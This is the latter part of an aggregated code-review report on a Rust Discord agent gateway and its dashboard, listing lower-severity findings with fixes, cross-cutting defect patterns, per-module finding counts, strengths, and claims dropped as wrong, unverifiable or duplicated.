- Impact: Configuration advertises a distinction absent from routing; this also covers the duplicate PoiseData-field finding.
- Fix: Either honor the setting consistently in thread session construction, including auto-thread starters, or explicitly remove/deprecate it if shared guild sessions are intentional.

### Requester isolation is absent from the global approval policy
- Location: src/discord/approval.rs:559
- What: Approval resolution receives no actor context and relies on the caller's global paired-or-allowlisted policy.
- Trigger: Paired user B can see A's approval and click it, but the reviewed sources do not establish that paired users are meant to lack global approval authority.
- Impact: Requester isolation is not enforced; this is a delegation-policy hardening gap rather than a proven bypass of the current operator policy.
- Fix: Make the global approval-operator policy explicit; if paired users are not operators, pass actor/context to resolution and check that policy before consuming the pending entry.

### Pagination convergence lacks a proved fixed point
- Location: src/discord/throttler.rs:307
- What: Pagination convergence is limited to two header-aware passes without an asserted fixed point.
- Trigger: No concrete production input demonstrating nonconvergence was supplied or reproduced; the reported 3-to-4 example does not change denominator width.
- Impact: This is a boundary-test and algorithm-hardening gap, not a confirmed mislabeled production response.
- Fix: Add deterministic denominator-digit-boundary cases and either establish convergence or budget a conservative maximum header width.

### XML-illegal table controls force the raw-text fallback
- Location: src/discord/table_render/mod.rs:291
- What: SVG text escaping does not remove XML-illegal control characters.
- Trigger: A markdown table cell contains a NUL or terminal escape control character.
- Impact: PNG parsing can fail, but the caller logs the error and preserves raw table text; no delivery loss is established.
- Fix: Filter XML-illegal characters before SVG generation while retaining the existing raw-text fallback.

### Async migration embeds synchronous waits
- Location: src/migrate/sys.rs:625
- What: The migration environment implements sleep with std::thread::sleep inside an async CLI workflow.
- Trigger: The dedicated migration command waits for process retirement.
- Impact: Bounded worker blocking is visible, but contention with a running gateway is not demonstrated.
- Fix: Run the synchronous OS retirement phase in spawn_blocking or make its wait asynchronous.

### DeliveryReceipt duplicates an unused delivery representation
- Location: src/models/ledger.rs:17
- What: DeliveryReceipt is defined and re-exported but has no internal production use in source references.
- Trigger: Maintainers or external consumers choose between overlapping delivery types.
- Impact: The public domain model is confusing; lack of internal use alone does not prove external consumers are absent.
- Fix: Clarify/deprecate its role before any removal and prefer the service's actual ledger/obligation representations.

### Error conversion discards typed database causes
- Location: src/error.rs:33
- What: Database errors are converted into strings and lose their structured source chains.
- Trigger: Callers need to classify a database failure rather than display its text.
- Impact: Diagnostics and future retry classification are harder; no concrete failed retry policy was proven by this finding.
- Fix: Preserve typed/source errors and distinguish serialization failures when the API next needs structured classification.

### Ledger entities bypass their typed status enums
- Location: src/ledger/service.rs:47
- What: Ledger entity fields and mutation helpers use strings despite corresponding state enums.
- Trigger: A future caller or edit introduces an invalid state spelling.
- Impact: State-machine mistakes lose compile-time checking; current constants alone do not demonstrate corruption.
- Fix: Use typed state/status values internally and explicit database conversions.

### PID liveness helper does not reject values above signed PID range
- Location: src/ledger/service.rs:64
- What: Casting u32 to i32 permits negative special PID values in a signal-zero liveness probe.
- Trigger: A direct caller supplies a value above i32::MAX; ordinary OS-issued process IDs do not provide this trigger.
- Impact: The probe can check a process group instead of one process; signal zero does not terminate or signal those processes.
- Fix: Reject out-of-range PID values before the cast, retaining the existing zero check.

### Root wildcard exports obscure the intended public API
- Location: src/lib.rs:18
- What: Root glob re-exports expose new public module items without explicit API review.
- Trigger: A module adds a public item or a name colliding with another export.
- Impact: Public-surface clarity and compatibility become harder to maintain; no current runtime failure is established.
- Fix: Replace globs with deliberate export lists as API maintenance, preserving existing supported consumers.

### Session state does not preserve unknown top-level JSON fields
- Location: src/models/session.rs:268
- What: Serde ignores unrecognized top-level fields that are then absent on reserialization.
- Trigger: A future/newer writer adds top-level fields and an older gateway rewrites that state; no existing mixed-version field was identified.
- Impact: Forward-compatible round-tripping is not guaranteed, while arbitrary keys inside metadata remain preserved.
- Fix: Define the compatibility policy and, if unknown top-level fields must round-trip, capture them in a flattened extra map.

### Silence regex has an incorrect trailing character class
- Location: src/models/events.rs:69
- What: The raw regex uses a double-backslash s character class, matching literal backslash/s rather than whitespace there.
- Trigger: A direct silence check receives an odd suffix such as `(silent)s`; ordinary trailing whitespace is already removed by the caller's trim.
- Impact: The accepted silence-token set is broader than intended; the report's `(silent) ` visible-output example is contradicted by the surrounding code.
- Fix: Use a single-backslash whitespace class and test the machine-consumed sentinel classifications rather than prose wording.

### Public GC configuration accepts a zero interval
- Location: src/multiplexer/gc.rs:18
- What: A zero public gc_interval reaches Tokio interval construction without validation.
- Trigger: A library caller supplies Duration::ZERO; inspected production constructors use nonzero defaults.
- Impact: The spawned collector panics, not a demonstrated routine-input process-wide crash.
- Fix: Validate the interval at the constructor boundary and expose unexpected collector task failure.

### NFKC naming overstates the implemented normalization
- Location: src/security/normalize.rs:67
- What: The function preserves compatibility characters except for a fullwidth-ASCII subset.
- Trigger: A caller assumes full Unicode compatibility normalization from the function name.
- Impact: The API contract is misleading; no shell lookalike execution exploit is established.
- Fix: Rename it to describe fullwidth-ASCII mapping unless full NFKC is actually required.

### Cron session foreign-key lookup lacks a matching index
- Location: migrations/0001_initial.sql:48
- What: The migration declares a cascading session key without a corresponding cron session-key index in the inspected migration set.
- Trigger: Deleting sessions in a database containing many cron jobs.
- Impact: Potential avoidable full scans; no production latency or outage threshold is demonstrated.
- Fix: Add an index on cron_jobs(session_key).

### Dead-target IDs use a different SQL representation
- Location: migrations/0019_dead_targets.sql:3
- What: dead_targets stores u64 IDs via signed INTEGER while adjacent schemas use TEXT.
- Trigger: A future or synthetic channel ID is at least 2^63.
- Impact: External SQL interpretation can become inconsistent, but the Rust round trip preserves bits and no current Discord failure is demonstrated.
- Fix: Standardize this column and its bindings on decimal TEXT in a forward migration when cross-table use is needed.

### FTS builder strips quotes before escaping them
- Location: src/storage/message_search.rs:223
- What: The query builder removes every quote then attempts to escape quotes in the resulting terms.
- Trigger: A caller supplies quoted search text.
- Impact: The escaping step is dead and phrase semantics are unavailable; exact-phrase support is not an established API promise.
- Fix: Remove redundant escaping and document term-prefix semantics, or add intentional phrase parsing if required.

### Migrations duplicate indexes already covered by keys
- Location: migrations/0018_bot_cursors.sql:10
- What: The bot-cursor lookup index duplicates its composite primary-key index.
- Trigger: Every bot-cursor update maintains both indexes.
- Impact: Unnecessary index storage and write work; cron incident and notepad lookup indexes have the same duplication/prefix pattern.
- Fix: Remove redundant cursor/incident indexes and confirm whether the notepad prefix index merits its extra storage.

### Obligation index does not match retention ordering
- Location: migrations/0006_delivery_obligations.sql:16
- What: The state index orders attempts and created_at rather than the pruning worker's updated_at.
- Trigger: Age/count pruning of a large set of terminal obligations.
- Impact: Potential extra scanning and sorting, not a demonstrated runtime failure.
- Fix: Add a retention index on delivery_obligations(state, updated_at) after confirming the query plan.

### Thread-owner access repeats schema setup
- Location: src/storage/db.rs:273
- What: Each thread-owner query executes CREATE TABLE IF NOT EXISTS before its data operation.
- Trigger: Any thread-owner lookup after the table already exists.
- Impact: Redundant schema work and duplicated ownership of schema setup; exclusive locks and cache invalidation on every no-op are not proven.
- Fix: Create the table once through a migration and remove repeated DDL from accessors.

### Lazy provider duplicates the relative database default
- Location: src/tools/message_context_lazy.rs:28
- What: The lazy provider independently resolves DATABASE_URL and duplicates the relative sqlite://omon_gateway.db default used by main.
- Trigger: DATABASE_URL is unset; a differing database would additionally require different resolution context or later configuration drift, neither demonstrated by this lane.
- Impact: Duplicate resolution is a maintenance risk, not evidence that the provider currently opens a different database: src/main.rs:185-186 uses the same fallback in the same process.
- Fix: Pass the already-resolved database URL or shared pool into the provider instead of independently duplicating resolution; do not introduce a new missing-variable failure solely because the default is relative.

### Voice channel constructor accepts a panic-inducing zero capacity
- Location: src/voice/pipeline.rs:278
- What: The public constructor forwards capacity directly to Tokio mpsc without validating zero.
- Trigger: A library caller passes zero; no production caller supplying zero was found.
- Impact: The caller can panic, but a gateway process crash on routine input is not demonstrated.
- Fix: Require NonZeroUsize or return a configuration error for zero rather than silently changing requested capacity.

### WAV construction does not reserve its known final size
- Location: src/voice/pipeline.rs:155
- What: WAV output starts with an empty Vec and grows while samples are appended.
- Trigger: A large PCM frame requires repeated capacity growth.
- Impact: Avoidable allocations/copies occur; Vec's geometric growth does not establish the lane's exaggerated allocation count or a correctness failure.
- Fix: Reserve header bytes plus encoded sample bytes before appending.

### In-file timezone tests never exercise a DST gap or fold
- Location: src/cron/scheduler.rs:2062
- What: Timezone tests check seasonal offsets but not DST gaps and folds.
- Trigger: Scheduling logic is changed around nonexistent or repeated local firing times.
- Impact: The current tests do not establish a transition policy or catch its regression.
- Fix: Add deterministic next-fire cases at the exact spring and fall transition instants, including repeated advancement through the fold, and explicitly assert the chosen skip/duplicate policy without real-time sleeps.

### Legacy single-store cutover remains a separate test path
- Location: src/migrate/cron_cutover.rs:613
- What: cutover_store retains a separate non-receipted implementation beside cutover_cron_stores.
- Trigger: Tests exercise the legacy helper rather than the production receipt workflow.
- Impact: Duplicate migration logic increases maintenance and can give misleading coverage.
- Fix: Move the relevant stale-state test onto the production multi-store path and remove the obsolete helper if no external API consumer needs it.

### Typing error-path test can pass without running the failing backend
- Location: src/multiplexer/actor.rs:1402
- What: The test queues Stop immediately after Event and waits for the stop result rather than the backend error.
- Trigger: The biased mailbox branch consumes the already queued Stop before polling FailingRunner.
- Impact: Stop emits the expected typing pair and masks broken error-completion cleanup.
- Fix: Submit an acknowledged event and await its bounded terminal error before ending the actor.

### Approval-mode example is incomplete
- Location: .env.example:168
- What: The approval-mode comment ends mid-sentence without an accompanying assignment in that section.
- Trigger: An operator configures the service from .env.example.
- Impact: The approval configuration is unclear; the broader complete-environment inventory was not independently re-audited.
- Fix: Complete the comment and provide the supported APPROVAL_MODE example/default.

### Compose does not provide a host-dashboard access configuration
- Location: docker-compose.yml:2
- What: The service has no published dashboard port and the example binds the dashboard to container loopback.
- Trigger: An operator wants host access using the supplied Compose stack.
- Impact: Extra deployment configuration is necessary; EXPOSE alone would not fix access and host publication is not an established default requirement.
- Fix: Document opt-in loopback host publishing plus DASHBOARD_HOST=0.0.0.0 inside the container and required authentication.

### Gitignore repeats a web dependency entry
- Location: .gitignore:21
- What: web/node_modules/ appears twice.
- Trigger: Maintainers edit the ignore file.
- Impact: Redundant configuration noise only.
- Fix: Remove the duplicate entry.

### Test workspace cleanup is not failure-safe
- Location: tests/test_discord_adapter.rs:1385
- What: The workspace helper returns an unmanaged path and cleanup is manual at call sites.
- Trigger: An assertion panics before the explicit remove_dir_all cleanup.
- Impact: Temporary files can survive failed tests; all inspected normal paths do attempt cleanup, so a leak on every run is not supported.
- Fix: Use TempDir ownership so cleanup also runs during unwinding.

### Typing test checks dispatch success but not observable typing
- Location: tests/test_discord_adapter.rs:1357
- What: The test awaits two dispatch Results without asserting outbound requests or actor state.
- Trigger: Typing delivery regresses while dispatch continues returning Ok.
- Impact: The test can pass despite missing typing behavior; it does check Result success, contrary to saying it asserts nothing.
- Fix: Use a transport-level fixture or observable actor state and assert typing start/stop effects.

### Dual codebase divergence between web/src and web/src/lib/api
- Location: web/src/pages/ChatPage.tsx:29
- What: Legacy page and API source coexist with the active App implementation.
- Trigger: A maintainer edits a residual page or client rather than the active surface.
- Impact: Parallel implementations invite contract drift; this citation alone does not prove a runtime authentication mismatch.
- Fix: Identify the active entry-point import graph and remove or clearly quarantine redundant legacy pages and clients.

### Markdown code props bypass type checking through any
- Location: web/src/App.tsx:817
- What: The markdown code component uses any for props rather than the renderer's supported type.
- Trigger: A future plugin or dependency changes the component prop contract.
- Impact: Type checking cannot catch mismatches; any casting does not itself unescape HTML or demonstrate DOM injection.
- Fix: Use the react-markdown component prop types and remove any without inventing an HTML-unescaping workaround.

### Missing empty state UI on capabilities lists
- Location: web/src/App.tsx:1233
- What: Capabilities cards render no explanatory empty state.
- Trigger: The tools or skills endpoint returns an empty items array.
- Impact: Users see blank lists without guidance about unavailable capabilities.
- Fix: Add fallback empty state notices when `tools.length === 0` or `skills.length === 0`.

### Window alert and confirm dialogs block browser UI thread
- Location: web/src/pages/BotsPage.tsx:42
- What: Bot-page errors and confirmations use blocking browser dialogs.
- Trigger: An API failure opens alert or a destructive operation invokes confirm.
- Impact: The interaction blocks the tab instead of using the application's nonblocking UI.
- Fix: Replace `alert()` and `confirm()` with a toast notification hook or the existing `ConfirmDialog` component.

## Cross-cutting patterns

- **Acknowledgement precedes durable success.** Recovery consumes intent at src/main.rs:449 and src/storage/db.rs:529; monitor state advances before delivery at src/cron/executor.rs:164; permanent approval is published before storage at src/discord/approval.rs:489. Retire retry state only at the terminal boundary.
- **State has multiple owners without version checks.** Runner completion replaces actor state at src/multiplexer/actor.rs:424; suspension rewrites stale JSON at src/storage/db.rs:384; reclamation ignores the observed lease at src/cron/scheduler.rs:1037. Use single ownership and atomic revision checks.
- **Identity disappears in fallback or reuse.** Fan-out reuses a session at src/cron/scheduler.rs:1674; monitors use unscoped IDs at src/cron/executor.rs:145; mirror lookup skips bot uniqueness at src/mirror.rs:120. Preserve bot/profile, channel/thread, and run identity through dispatch and persistence.
- **Bounds arrive after allocation.** Terminal capture at src/tools/terminal.rs:372 and file reading at src/tools/file.rs:77 precede truncation; variants amplify scripts at src/security/normalize.rs:1035; web decoding precedes limits at src/tools/web.rs:180. Bound bytes, variants, age, and concurrency before retention.
- **Cancellation does not own complete operations.** Sends leak ownership at src/multiplexer/router.rs:179, retirement is abandoned at src/multiplexer/gc.rs:61, writes precede deadlines at src/tools/mcp.rs:133, and cleanup leaves descendants at src/tools/terminal.rs:356. Use cancellation-safe ownership and end-to-end deadlines with bounded cleanup.
- **Authorization checks text or origin instead of the eventual actor and operation.** Denies miss wrappers at src/security/hardline.rs:181, environment overrides change executables at src/tools/terminal.rs:369, and loopback administration lacks credentials at src/dashboard.rs:698. Authenticate principals and classify the actual executable/argv/environment.
- **Framing and canonicalization run in the wrong order.** Chunk decoding corrupts SSE at src/tools/mcp.rs:308 and src/agent/llm.rs:245; sentinel matching precedes invisible-character removal at src/security/neutralize.rs:35. Frame bytes and canonicalize complete input before interpretation.
- **Tests substitute time for completion.** tests/test_wiring_e2e.rs:273 and tests/test_cron_schedule_parity.rs:201 race persistence. Subscribe to exact terminal events before triggering work and await them with bounded timeouts; controlled time belongs in tests of temporal behavior.

## Module health table

The aggregates do not supply per-lane LOC totals. To avoid inventing them, `>=` is a counted lower bound: full physical LOC in citation-bearing files, including in-file tests. This covers **60 `src/` files / 48,407 LOC**; the other **3,920 LOC** of the supplied Rust scope are not allocated to lanes here. SQL, test, configuration, and web LOC appear in their respective rows in addition to the Rust total. Counts belong to primary modules; merged secondary sites do not inflate them. Zero findings does not prove correctness.

| Module group | LOC reviewed | P0 | P1 | P2 | One-line assessment |
| --- | ---: | ---: | ---: | ---: | --- |
| Runtime entry, readiness, drain, mirror | >= 5,240 | 0 | 26 | 1 | Shutdown/recovery lose ownership; optional dashboard has separate handles. |
| Multiplexer and profile routing | >= 3,401 | 1 | 23 | 3 | Reset corrupts continuity; cancellation and snapshots undermine ownership. |
| Agent protocol and daemon | >= 2,290 | 0 | 23 | 0 | Correlation and cleanup fail under reordering, stalls, and restart. |
| Agent config, workspace, residual LLM | >= 1,386 | 0 | 6 | 2 | Streaming and configuration lack consistent boundaries. |
| Voice capture and speech | >= 377 | 0 | 6 | 2 | Multi-frame/codec contracts are incomplete; production reachability is limited. |
| Models, memory, ledger, shared API/errors | >= 2,329 | 0 | 7 | 7 | Durable transitions need atomicity and stronger types. |
| Discord ingress, egress, recovery | >= 4,710 | 0 | 39 | 3 | Delivery, buffering, identity, and lifecycle defects dominate. |
| Commands, attachments, rendering | >= 3,865 | 1 | 14 | 2 | Compression loses concurrent messages; input/formatting bounds vary. |
| Pairing and approvals | >= 2,273 | 0 | 8 | 1 | Useful transactions coexist with publication and lifetime races. |
| Cron scheduling and delivery | >= 2,842 | 2 | 24 | 2 | Destination identity corrupts delivery; leases and deadlines need repair. |
| Cron stores, scripts, monitors, ack | >= 2,749 | 0 | 12 | 5 | Sync and monitoring publish partial progress. |
| Rust dashboard and standalone runtime | >= 3,671 | 2 | 6 | 6 | Local authentication is absent; partial updates erase configuration. |
| React dashboard | >= 3,470 | 0 | 8 | 4 | Cancellation, stale results, reconnect, and keyboard access need repair. |
| Command security, normalization, scans | >= 2,487 | 2 | 27 | 1 | Text policy has semantic gaps and expensive amplification. |
| Terminal, file, browser, MCP | >= 2,374 | 2 | 22 | 1 | Approval identity and SSE corruption are P0; I/O limits/ownership are P1. |
| Web, skills, cron, lazy context tools | >= 1,827 | 0 | 5 | 2 | URL disclosure, oversized reads, and silent fallback need explicit outcomes. |
| SQLite, search, cited migrations | >= 2,676 | 0 | 5 | 6 | Durability primitives coexist with stale writes and partial operations. |
| Migration, config import, cutover | >= 4,017 | 0 | 9 | 3 | Receipts are useful; profile selection and failure phases diverge. |
| Tests and deployment | >= 6,346 | 1 | 3 | 8 | Docker cannot build; tests depend on timing or external fixtures. |
| Rust static checks | N/A (checks) | 0 | 0 | 0 | Supplied checks are clean, not proof of correctness. |
| **Total findings** | **52,327 Rust LOC scope plus web/support; lane figures are lower bounds** | **11** | **273** | **59** | **Static verification is not runtime reproduction.** |

## What this codebase does well

- **The dashboard network boundary is real.** src/dashboard.rs:219 rejects non-loopback Host values, and src/dashboard.rs:229 requires same-origin Origin for WebSocket upgrades. Preserve these while adding local authentication and HTTP CSRF protection.
- **SQLite durability is deliberate.** src/storage/db.rs:163 configures foreign keys and a five-second busy timeout, src/storage/db.rs:169 selects WAL for file databases, and src/storage/db.rs:186 applies migrations before returning a database. The single-writer pool is an explicit tradeoff, not a missing busy handler.
- **Pairing does not grant access before commit.** src/discord/pairing.rs:479 consumes the code transactionally, and src/discord/pairing.rs:510 commits before cache publication. The cancellation window is a publication defect, not a transaction-free authorization design.
- **Cutover recovery uses durable evidence.** src/migrate/cron_cutover.rs:157 loads saved replacement bytes and hashes; recovery validates payloads before advancing stores and preserves backups when evidence is invalid.
- **Approval fails closed without an operator channel.** src/tools/terminal.rs:275 rejects an approval-required command without a session, and src/tools/terminal.rs:281 rejects it without an approval requester. Repair executable identity and parsing without weakening these protections.

## Dropped claims

These claims are excluded as wrong, unverifiable, or duplicated. Other aggregate findings remain above with the stated re-grades; no valid unique findings are silently deferred.

- **agent-workspace P0: boot-time migration wipes bindings on every reboot (src/agent/workspace_migration.rs:15)** — The destructive helper exists, but source references show only definition, export, and tests, not a production call. The asserted src/main.rs:480 is a closing brace, not a migration call. Current gateway startup does not demonstrate the claimed unconditional wipe.
- **agent-workspace P0: arbitrary workspace path traversal (src/agent/agent_workspace.rs:79)** — The production caller at src/agent/omo_backend.rs:305-310 passes `agent_workspace_slug`, whose sanitizer removes separators and adds a fixed category prefix. Public raw Path::join behavior alone does not establish attacker-controlled breakout in this gateway.
- **agent-workspace P2: missing config root disables production workspaces (src/agent/omo_config.rs:201)** — Actual gateway and dashboard constructors immediately inject their resolved workspace roots (src/main.rs:662; src/dashboard_runtime.rs:117). The report names only a hypothetical secondary caller, not a failing existing path.
- **agent-workspace P2: empty cron identifier produces illegal/colliding slug (src/agent/agent_workspace.rs:54)** — `cron-` is a legal directory component. No production source of distinct empty-ID cron jobs or enforced trailing-hyphen prohibition was established; identical empty identifiers are not proof of a collision between valid distinct jobs.
- **agent-workspace P2: cron total timeout below gap timeout is defective (src/agent/omo_config.rs:233)** — Backend waits take the minimum of total/work and gap deadlines (src/agent/omo_backend.rs:797-801); a shorter total budget is valid and still enforced. Clamping the longer gap does not repair a demonstrated failure.
- **voice P0: RTP raw-packet offset corrupts every packet (src/voice/mod.rs:67)** — The slicing line resolves, but the claim depends on the external Songbird version's exact RtpData offset/buffer contract. That dependency implementation is not established by the allowed repository source, so the claimed offset error cannot be confirmed.
- **voice P1: receive mutex prevents concurrent processing (src/voice/pipeline.rs:298)** — A single mpsc receiver necessarily serializes dequeue access. The guard is released when receive returns, allowing consumers to process dequeued frames concurrently; no deadlock or processing serialization was demonstrated.
- **voice P1: equality-only buffer eviction permits unbounded growth (src/voice/pipeline.rs:82)** — Capacity/frames are private, push preserves the bound, and deserialize explicitly rejects frames.len() > capacity. The proposed over-capacity state is unreachable through this implementation.
- **voice P1: multiple speakers are irreversibly mixed (src/voice/mod.rs:41)** — Every emitted frame preserves source_id, so a shared channel does not itself lose speaker identity. No downstream consumer that ignores it or combines speakers without demultiplexing was found; nondeterministic ordering across distinct sources is not itself corrupted audio.
- **Media validation and upload reopen a mutable pathname** (discord-adapter, originally P1; src/discord/adapter.rs:1855): Merged into discord-adapter finding 11 at the identical src/discord/adapter.rs:1855 citation: reopening the validated pathname and unbounded file reading are covered together, not counted twice.
- **Unrestricted attachment download URL enables SSRF and private network exfiltration** (discord-commands, originally P0; src/discord/attachments.rs:352): Unverifiable attacker-controlled URL premise: adapter.rs copies attachment URLs from Discord Message attachment metadata, not an arbitrary message-body URL; no production path letting an ordinary sender replace that CDN URL or redirect target was established. Missing allowlisting alone does not establish SSRF.
- **`thread_sessions_per_user` configuration field is populated in `PoiseData` but unused in routing** (discord-commands, originally P2; src/discord/commands.rs:29): Duplicate of discord-adapter finding 42: both describe the same ignored thread_sessions_per_user configuration behavior; retained once at the session-construction site.
- **Starter message in `/thread` is routed to agent multiplexer but never posted to Discord thread** (discord-commands, originally P2; src/discord/commands.rs:1192): A slash-option starter can intentionally be an invisible agent prompt. The route call resolves, but no contract requires that input to be posted as a separate Discord message, so the alleged defect is unverifiable.
- **Potential process suicide on `libc::kill(-(pid as i32), SIGKILL)` when pid is zero** (cron-store-exec, originally P1; src/cron/executor.rs:421): The child PID comes from a successfully spawned Unix process and is checked as Some before signalling. Such a child does not have PID zero; no real trigger for the proposed kill(0) path was established.
- **Delivery destination parser silently drops targets with non-numeric thread IDs** (cron-store-exec, originally P2; src/cron/store.rs:661): These are Discord destinations, whose channel and thread IDs are numeric snowflakes. Rejecting alphanumeric IDs does not demonstrate a supported custom-adapter regression.
- **Slow log consumers trigger broadcast channel lag and cascading warning stalls** (dashboard, originally P1; src/dashboard.rs:2152): The bounded broadcast channel intentionally drops lagged logs and tells the slow client. The warning write blocks only that client task; no cascading producer or process-wide stall is demonstrated.
- **update_cron_job lacks pre-validation for empty cron expression strings** (dashboard, originally P2; src/dashboard.rs:1480): Wrong error-status claim: ApiError::from(OmonError::Config) maps configuration errors to BAD_REQUEST in dashboard.rs, so an invalid expression does not inherently become the alleged HTTP 500.
- **Chat WebSocket connection lacks token authentication or auth query parameter** (web-frontend, originally P0; web/src/App.tsx:555): No server token contract exists in the active dashboard router; WebSocket Origin is already checked server-side. Adding a legacy Hermes token would not fix a demonstrated handshake failure or implement server authentication.
- **Frontend API client omits session tokens and custom headers on all HTTP requests** (web-frontend, originally P0; web/src/api.ts:128): The active Rust API does not require the legacy Hermes token; request() preserves supplied headers, and fetch defaults to same-origin credentials. The alleged missing-auth 401 regression is not established.
- **Telemetry poll error state retains stale status values** (web-frontend, originally P2; web/src/App.tsx:296): The containing App already renders an Offline label and destructive status indicator when statusError is set (web/src/App.tsx:212-217). Retaining a last-known snapshot is not the claimed absence of offline feedback.
- **Unbounded message list rendering without virtualization** (web-frontend, originally P2; web/src/App.tsx:735): The active api.sessionMessages call uses the paginated server endpoint rather than fetching thousands of rows. No unbounded message-growth path was established from messages.map; virtualization would be optional hardening for a different loading contract.
- **tools-exec #8: File writes destroy old contents before replacement is safely available** (originally P0; src/tools/file.rs:137): Merged with tools-exec #6 at src/tools/file.rs:137: the retained write finding explicitly covers both pathname TOCTOU and truncate-before-success. Two distinct failure modes, one Location entry.
- **storage-db #2: Unbounded table growth across cron_outputs, delivery_ledger, and FTS tables with no retention or cascade pruning** (originally P0; migrations/0021_cron_outputs.sql:1): The aggregate claim is not established by the CREATE TABLE citation: delivery_ledger does have ON DELETE CASCADE; the search index also accepts independent REST/ingress documents, so tying every indexed row to transcript deletion is not automatically correct. No retention-wide audit or realistic disk-exhaustion rate was supplied. No P0 privacy/data-loss conclusion retained.
- **storage-db #3: Discarding platform_message_id on turn recovery causes downstream reply failure and unindexed search** (originally P1; src/storage/db.rs:569): The cited helper is not the boot entry point, and clearing the replay platform ID does not prove original messages become unindexed: the existing transcript INSERT trigger already indexes those messages. Platform reply/thread failure is not verified through a consumer, so the combined claim is dropped.
- **storage-db #8: N+1 sequential query pattern during restart recovery under single-connection pool** (originally P1; src/storage/db.rs:526): The cited loop belongs to the legacy storage helper; main.rs uses its own authorized recovery routine. Sequential awaits do not monopolize a pool between queries. The claimed severe startup starvation is not established by query count alone.
- **storage-db #12: Missing index on delivery_ledger for session created_at ordering causes temporary B-tree sorts** (originally P1; migrations/0001_initial.sql:36): The ordering queries cited by this finding occur in the legacy storage recovery helper, not the inspected boot recovery path. No exercised hot query or measurable failure establishes the proposed index as a carried-forward defect.
- **storage-db #14: Destructive table drop without migration reversibility** (originally P1; migrations/0003_message_sequence.sql:20): DROP follows INSERT ... SELECT of all existing rows in a normal SQLite table rebuild, executed by the SQLx migrator. Absence of down migrations is not proof that a failed forward migration loses the original table; no nontransactional execution or failed rollback was demonstrated.
- **storage-db #15: SQLite single-connection pool bottleneck and lack of busy handler retry policy** (originally P1; src/storage/db.rs:182): A single connection is an explicit writer-contention design choice, and a five-second busy handler exists. No nested checkout call path or measured throughput failure was named; changing pool topology and adding retry are not justified defects from this citation.
- **storage-db #16: Inconsistent datetime formats across tables prevent uniform ISO-8601 parsing and ordering** (originally P1; migrations/0001_initial.sql:9): Different datetime defaults exist, but the lane does not identify an actual parser or cross-format comparison that fails. SQLx SQLite datetime decoding must not be conflated with direct RFC3339 serde parsing.
- **storage-db #20: Hardcoded SQL string interpolation in upgrade_legacy_guild_session_keys** (originally P2; src/storage/db.rs:126): Table identifiers come from a fixed trusted array and values are bound. Runtime string construction does not inherently disable SQLx statement caching, and no SQL injection or concrete maintenance defect is shown.
- **migrate #4: Command Flag Parsing in gateway_down.rs Causes Process Termination Failure and Lock Deletion** (originally P0; src/migrate/gateway_down.rs:208): The source takes the next token, but the report does not establish that its proposed gateway -v/--port/-c spellings are accepted by the external Hermes CLI. Without a valid running process input, the claimed missed termination trigger is unverifiable; broad token skipping could weaken process identity checks.
- **migrate #5: Reconcile Pending Cutover Only Clears 1 Pending Op, Indefinitely Freezing Gateway Scheduler** (originally P0; src/migrate/cron_cutover.rs:146): LIMIT 1 exists, but ordinary cutover reconciles before inserting another receipt, and rerunning can reconcile the next pending receipt. The claim that only the newest can ever be reconciled or that ordinary interrupted retries necessarily create multiple pending operations is unsupported. Automatic startup reconciliation is an operational-policy suggestion, not a proven permanent freeze from this citation.
- **migrate #6: Missing start_time in Lock File Triggers Hard Error Instead of Graceful Fallback** (originally P1; src/migrate/gateway_down.rs:228): Failing closed when a live PID lacks a verifiable start-time identity is deliberate protection against signaling a reused PID. Missing start_time is explicitly rejected; replacing it with command-line-only identity is not a demonstrated correctness fix.
- **tests-ci #11: Zero test coverage for voice processing pipeline (src/voice/pipeline.rs and src/voice/mod.rs)** (originally P2; src/voice/pipeline.rs:1): A use statement at src/voice/pipeline.rs:1 cannot establish repository-wide zero coverage. The lane supplied no complete test-reference evidence that can be validated from that citation; do not promote an unverified absence claim.
- **tests-ci #12: Zero test coverage for browser automation tool (src/tools/browser.rs)** (originally P2; src/tools/browser.rs:8): The BrowserTool declaration confirms the type, not the absence of every integration test. Production browser defects are retained from tools-exec; this separate zero-coverage claim is unverifiable from its citation.
- **tests-ci #13: Zero test coverage for lazy message context provider (src/tools/message_context_lazy.rs)** (originally P2; src/tools/message_context_lazy.rs:12): The lazy-provider type declaration does not establish absence of indirect or integration coverage. No exhaustive consumer/test evidence accompanies the citation.
- **tests-ci #14: Dead code without test coverage: DeliveryReceipt in src/models/ledger.rs** (originally P2; src/models/ledger.rs:17): A public DeliveryReceipt declaration/re-export does not by itself establish dead code or lack of external consumers. Its deletion is not justified by the cited line.
- **Recovery marker consumption counted three times** — src/multiplexer/actor.rs:88 and src/storage/db.rs:529 are merged into src/main.rs:449; all implementations remain named.
- **Dashboard authentication and HTTP CSRF counted separately** — src/dashboard.rs:229 is merged into src/dashboard.rs:698; the fix includes authentication and mutation-origin protection.
- **Two unused authorization-helper findings** — src/multiplexer/profile_routing.rs:242 is merged into src/multiplexer/profile_routing.rs:235; neither is an established production bypass.
- **Unauthenticated public-network dashboard / remote RCE** — src/dashboard.rs:219 rejects non-loopback Host values, and src/dashboard.rs:229 checks WebSocket Origin; the defect is local authorization plus HTTP CSRF.
- **Every browser page can directly drive every JSON/DELETE endpoint** — browser preflight/private-network restrictions and JSON-only handlers constrain simple cross-origin pages; local processes have arbitrary endpoint access, while known no-body POST mutations provide the browser trigger.
- **Browser navigation lacks scheme restrictions** — src/tools/browser.rs:97 explicitly permits HTTP(S) only; loopback/link-local SSRF remains at src/tools/browser.rs:95 because hosts are unrestricted.
- **Docker COPY is at line 22** — Dockerfile:22 is blank; the stale COPY is at Dockerfile:21, the retained citation.
- **SQL injection through format! in cron claiming** — src/cron/scheduler.rs:1102 binds values to a query whose optional clause is constant at src/cron/scheduler.rs:1084; src/storage/db.rs:126 interpolates only a hardcoded table array. Both are safe.
- **Cleanup symlinks automatically make rm delete final referents** — src/security/dangerous.rs:305 lacks a symlink check, but rm removes a final symlink itself; the retained trigger names executable expansion and symlinked ancestors.

No primary aggregate citation failed to resolve. The incorrect secondary Docker citation is dropped and corrected. Line verification does not imply runtime reproduction or successful exploitation.
